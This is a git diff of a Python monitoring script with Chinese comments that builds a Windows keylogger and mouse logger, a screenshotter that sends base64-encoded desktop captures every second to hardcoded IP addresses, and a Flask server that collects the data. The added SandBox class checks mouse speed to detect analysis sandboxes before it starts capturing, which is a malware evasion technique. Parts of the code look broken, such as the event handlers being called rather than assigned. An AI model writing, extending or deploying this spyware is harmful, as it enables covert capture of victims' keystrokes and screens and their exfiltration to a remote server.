@@ -1,19 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding-utf-8 -*-
 
-"""
-需求：
-1. 截获键盘与鼠标操作
-2. 截获信息后，转换为JSON 格式，通过HTTP 发送到服务器
-3. 后台运行python 脚本（可考虑添加后台服务）
-4. 服务端接收记录
-"""
-
 import fire
 from loguru import logger
 
 # # ------------------------------------------------------------------------------------
-import pyHook
+import pyHook # pyHook 只支持到 python 3.7
+import pyhooked
 import pythoncom
 
 class MonitorLogger(object):
@@ -24,12 +17,13 @@ class MonitorLogger(object):
 class KeyMouseLogger(object):
     """
     Key or Mouse Logger
+    负责记录键盘和鼠标的移动情况，然后将记录情况发送给指定服务端
 
     Usage:
         python monitor_logger.py key_mouse_logger
     """
     def __init__(self):
-        self.client = FlaskClient
+        self.fc = FlaskClient()
 
     def OnKeyboardEvent(self, ip, event, client):
         key_board_event = {
@@ -53,9 +47,9 @@ class KeyMouseLogger(object):
     
     def key_mouse_logger(self, ip = '202.100.1.224'):
         hm = pyHook.HookManager() # create a hook manager
-        hm.KeyDown = self.OnKeyboardEvent(ip, self.client) # watch for all keyboard events
+        hm.KeyDown = self.OnKeyboardEvent(ip, self.fc) # watch for all keyboard events
         hm.HookKeyboard() # set the hook
-        hm.MouseAll = self.OnMouseEvent(ip, self.client) # watch for all mouse events
+        hm.MouseAll = self.OnMouseEvent(ip, self.fc) # watch for all mouse events
         hm.HookMouse() # set the hook
         pythoncom.PumpMessages() # wait forever
 
@@ -73,12 +67,13 @@ screenshotter_path = 'C:\\WINDOWS\\Temp\\screenshot.bmp'
 class ScreenShotter(object):
     """
     ScreenShotter
+    负责对Windows 环境桌面截屏，案后将截屏图片发送给指定服务端
 
     Usage:
         python monitor_logger.py screenshotter_logger
     """
     def __init__(self):
-        self.client = FlaskClient
+        self.fc = FlaskClient()
 
     def img_b64(self, img):
         b4code = base64.b64encode(img)
@@ -105,18 +100,18 @@ class ScreenShotter(object):
         mem_dc.DeleteDC()
         win32gui.DeleteObject(screenshot.GetHandle())
 
-    def screenshotter_read(self, ip, client):
+    def screenshotter_logger(self, ip, client):
+        self.screenshotter()
         screenshot_image = open(screenshotter_path, 'rb').read()
         dict_key = {}
         dict_key['MessageType'] = 'ImageEvent'
         dict_key['ImageData'] = self.img_b64(screenshot_image)
         client.http_post_json(ip, dict_key)
 
-    def screenshotter_logger(self, ip = '202.100.1.24'):
+    def screenshotter_loggers(self, ip = '202.100.1.24'):
         while True:
             time.sleep(1)
-            self.screenshotter()
-            self.screenshotter_read(ip, self.client)
+            self.screenshotter_logger(ip, self.fc)
 
 
 event_json = '/server_json'
@@ -133,6 +128,7 @@ headers = {
 class FlaskClient(object):
     """
     Flask Client
+    客户端，发送器
 
     Usage:
         python monitor_logger.py flask_client_json
@@ -164,19 +160,18 @@ node = Flask(__name__)
 class FlaskServer(object):
     """
     Flask Server
+    服务端，接收器
 
     Usage:
         python monitor_logger.py flask_server_json
     """
-    def __init__(self):
-        node.run(host = '0.0.0.0', port = 5000) # 默认端口 5000
-
     def b64_img(self, b64):
         b4code = bytes(b64, 'utf-8')
         img = base64.b64decode(b4code)
         return img
     
     def flask_server_json(self):
+        node.run(host = '0.0.0.0', port = 5000) # 默认端口 5000
         if request.method == 'POST':
             json_data = request.get_json()
             if json_data['MessageType'] == 'ImageEvent':
@@ -191,6 +186,27 @@ class FlaskServer(object):
                 logger.info(json_data)
             logger.info('got data')
             return
+
+
+# # ------------------------------------------------------------------------------------
+import time
+from SmoothCriminal import mean_mouse_speed
+
+class SandBox(object):
+    """
+    SandBox
+    
+    Usage:
+        python monitor_logger.py sandbox
+    """
+    def sanbox(self):
+        ss = ScreenShotter()
+        timeout = 10
+        if mean_mouse_speed(timeout):
+            logger.info("This is a box of sand")
+        else:
+            logger.info("Environment ok! Let's do it")
+            ss.screenshotter_loggers()
 
 
 if __name__ == '__main__':
